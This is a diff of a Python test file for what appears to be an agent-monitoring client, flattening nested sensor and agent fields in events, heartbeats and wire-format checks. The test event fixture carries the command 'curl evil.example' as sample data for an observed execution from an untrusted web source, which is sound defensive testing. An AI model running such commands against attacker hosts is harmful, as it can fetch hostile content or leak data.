@@ -163,11 +163,11 @@ def client(server):
 def make_event(**over):
     kw = dict(
         kind="exec", observation_point="execution",
-        subject={"agent_id": "agent-1", "agent_type": "test"},
+        agent_id="agent-1", agent_type="test",
         payload={"command": "curl evil.example"},
         guard_id="ga-1",
         timestamp="2026-08-11T00:00:00Z", session_id="sess-1",
-        sensor={"id": "test-sensor", "class": "in_process", "version": None},
+        sensor_id="test-sensor", sensor_type="in_process",
         provenance=[Provenance(source="web", trust="untrusted")],
     )
     kw.update(over)
@@ -274,10 +274,10 @@ def test_enroll(server, client):
 
 
 def test_heartbeat(server, client):
-    assert client.heartbeat(sensor={"id": "test-sensor"}, interval_s=30,
+    assert client.heartbeat(sensor_id="test-sensor", interval_s=30,
                             counters={"events": 5}) == {"ok": True}
     body = server.requests[-1]["body"]
-    assert body == {"sensor": {"id": "test-sensor"}, "interval_s": 30,
+    assert body == {"sensor_id": "test-sensor", "interval_s": 30,
                     "counters": {"events": 5}}
 
 
@@ -366,7 +366,9 @@ def test_event_to_wire_matches_schema_structure():
     assert no_empties(wire)  # empty optionals never reach the wire
 
     # nested objects are cleaned too (schema forbids nulls in them)
-    assert wire["sensor"] == {"id": "test-sensor", "class": "in_process"}
+    assert wire["sensor_id"] == "test-sensor"
+    assert wire["sensor_type"] == "in_process"
+    assert wire["agent_id"] == "agent-1"    # flat on the wire — no envelope
     prov_props = schema["properties"]["provenance"]["items"]["properties"]
     for p in wire["provenance"]:
         assert set(p) <= set(prov_props)
